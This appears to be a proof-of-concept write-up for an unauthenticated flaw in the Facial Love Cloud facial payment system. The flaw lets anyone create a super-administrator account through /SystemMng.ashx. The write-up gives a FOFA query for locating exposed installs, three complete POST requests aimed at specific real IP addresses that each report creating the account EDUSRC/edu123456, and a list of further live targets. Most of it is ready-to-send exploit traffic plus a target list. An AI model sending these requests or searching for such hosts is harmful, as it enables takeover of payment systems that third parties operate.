Unauthorized creation of super administrator account exists in Facial Love Cloud Facial Payment System Procedure

official website:  [http://www.szjocat.com/#](http://www.szjocat.com/#)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36030634/1699082462990-170530e7-b51a-434f-be1f-a826e7cd5121.png#averageHue=%23dde1dd&clientId=u20ef8c53-71fe-4&from=paste&height=734&id=ue0adbf25&originHeight=917&originWidth=1730&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1010327&status=done&style=none&taskId=u608df680-c666-4b02-8a7b-06dc84e9e56&title=&width=1384)
Version:  All versions of this product

Function point:  Add super administrator option for personnel management in the system management center module

FOFA syntax

```
icon_hash="241050903" && ip!="101.200.146.70"
```
Instance reproduction1:
```
 http://140.210.211.116:1040/Login.aspx
```
![](https://cdn.nlark.com/yuque/0/2023/png/36030634/1698418397808-20962f45-6cb8-4c28-b6c8-ee0cf4844970.png#averageHue=%23bce3e5&clientId=ua4300237-c4cd-4&from=paste&id=u309383de&originHeight=818&originWidth=1359&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u96e94d27-1bda-4ca5-83d1-96012185657&title=)
Unauthorized creation of super administrator account, sending the following data packet with a status code of 200, and successfully creating user EDUSRC/edu123456
```
POST /SystemMng.ashx HTTP/1.1
Host: 140.210.211.116:1040
Content-Length: 176
Accept: /
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://140.210.211.116:1040
Referer: http://140.210.211.116:1040/Login.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

operatorName=EDUSRC&operatorPwd=edu123456&operpassword=123&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
```
![](https://cdn.nlark.com/yuque/0/2023/png/36030634/1698418483134-2aa9afb9-6bcc-4f27-86ab-8e561063be9f.png#averageHue=%23f8f7f7&clientId=ua4300237-c4cd-4&from=paste&id=u75cfc394&originHeight=489&originWidth=1128&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u018f9a50-0f23-4f84-835c-0466da6d27d&title=)
Instance reproduction2:
```c
 http://140.210.211.116:1200/Login.aspx
```
![](https://cdn.nlark.com/yuque/0/2023/png/36030634/1699081210248-7330b7d6-1e0b-4b8e-9d73-016e6e4f15d5.png#averageHue=%23c0e5e8&clientId=u20ef8c53-71fe-4&from=paste&id=u9df9c9f1&originHeight=964&originWidth=1513&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uc24d3d85-5184-4e48-bb0d-8e6bbb8b8f7&title=)
Unauthorized creation of super administrator account, sending the following data packet with a status code of 200, and successfully creating user EDUSRC/edu123456
```c
POST /SystemMng.ashx HTTP/1.1
Host: 140.210.211.116:1040
Content-Length: 176
Accept: /
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://140.210.211.116:1040/Login.aspx
Referer: http://140.210.211.116:1040/Login.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

operatorName=EDUSRC&operatorPwd=edu123456&operpassword=123&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
```
![](https://cdn.nlark.com/yuque/0/2023/png/36030634/1699081237456-a8db3d74-c130-46dc-ab66-692ec67d96ec.png#averageHue=%23f8f8f7&clientId=u20ef8c53-71fe-4&from=paste&id=u0f7d4a5d&originHeight=523&originWidth=1124&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ufe46a16e-c531-4532-bf85-6c14af2fb64&title=)
![](https://cdn.nlark.com/yuque/0/2023/png/36030634/1699081245115-bbfe7290-d207-472d-aae8-6ea4d4785e44.png#averageHue=%23263422&clientId=u20ef8c53-71fe-4&from=paste&id=u371b86f1&originHeight=820&originWidth=1587&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u14e9566d-1329-48b8-8418-2113fdff759&title=)
Instance reproduction3:
```c
 http://116.63.182.155:1000/Login.aspx
```
![](https://cdn.nlark.com/yuque/0/2023/png/36030634/1699081351874-bce07a19-cee4-4277-8f20-4b1b60985780.png#averageHue=%232c3825&clientId=u20ef8c53-71fe-4&from=paste&id=u1cb21288&originHeight=922&originWidth=1642&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u69b8f046-175f-4bf3-984e-a33b18df6f3&title=)
Unauthorized creation of super administrator account, sending the following data packet with a status code of 200, and successfully creating user EDUSRC/edu123456
```c
POST /SystemMng.ashx HTTP/1.1
Host: 116.63.182.155:1000
Content-Length: 176
Accept: /
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://116.63.182.155:1000
Referer: http://116.63.182.155:1000/View/SystemMng/OperatorMng.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

operatorName=EDUSRC&operatorPwd=edu123456&operpassword=123&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
```
![](https://cdn.nlark.com/yuque/0/2023/png/36030634/1699081383607-492441a8-879b-4f38-9267-8cca520853dd.png#averageHue=%23f8f7f7&clientId=u20ef8c53-71fe-4&from=paste&id=u4b2ec76e&originHeight=492&originWidth=1222&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u4c736dff-8868-46da-81dc-8ab1d1a1539&title=)
![](https://cdn.nlark.com/yuque/0/2023/png/36030634/1699081392305-2396cd8d-4f22-4777-a56a-7e98f112e6fb.png#averageHue=%23263422&clientId=u20ef8c53-71fe-4&from=paste&id=u5af43abe&originHeight=936&originWidth=1629&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u2599b7db-09a7-4d1c-889a-c9a70b65010&title=)
Other examples:
[http://1.15.20.244:1000/Login.aspx](http://1.15.20.244:1000/Login.aspx)
[http://8.134.140.252:1200/Login.aspx](http://8.134.140.252:1200/Login.aspx)
[http://221.233.243.136:1000/Login.aspx](http://221.233.243.136:1000/Login.aspx)
[http://ytwl.rlyzf.com:2000/Login.aspx](http://ytwl.rlyzf.com:2000/Login.aspx)
[http://101.34.53.232:898/Login.aspx](http://101.34.53.232:898/Login.aspx)
http://140.210.211.116:1040/Login.aspx
http://47.119.159.94:1000/Login.aspx



